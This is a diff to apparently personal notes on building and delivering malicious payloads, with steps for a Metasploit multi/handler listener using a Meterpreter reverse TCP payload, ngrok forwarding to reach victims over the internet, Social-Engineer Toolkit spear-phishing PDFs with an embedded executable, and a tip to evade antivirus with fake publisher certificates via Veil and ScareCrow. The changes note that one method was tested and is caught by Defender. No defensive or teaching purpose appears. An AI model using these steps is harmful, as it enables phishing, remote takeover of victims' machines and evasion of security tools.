@@ -34,13 +34,14 @@ search > searching of expiot,auxiliary,nops,payloads,posts
         set LPORT
         run
     note:- For WAN use portfordwing tools ngrock
-    to bypass anti-virous, add fake publisher certificate use veil-framework, ScareCrow 
+ 
 ---------------------------------------------------------------------------------------------------------------------------
-WAY 2
+WAY 2 -> tested and worked (detect by defender)
 use tool settoolkit
     > sudo ./settoolkit
     > select options for generate payload   
         example, >Spear-Phishing Attack Vectors >Create a FileFormat Payload> Adobe PDF Embedded EXE Social Engineering
+        payload generate at :-   /root/.set
     > Use metaspolite listenr to open session
         use exploit/multi/handler
         set payload windows/x64/meterpreter/reverse_tcp
@@ -48,3 +49,6 @@ use tool settoolkit
         set LPORT
         run
 ----------------------------------------------------------------------------------------------------------------------------
+
+Note :- sometimes some payload not worked at that time use diffrent frameworks
+to bypass anti-virous, add fake publisher certificate use veil-framework, ScareCrow
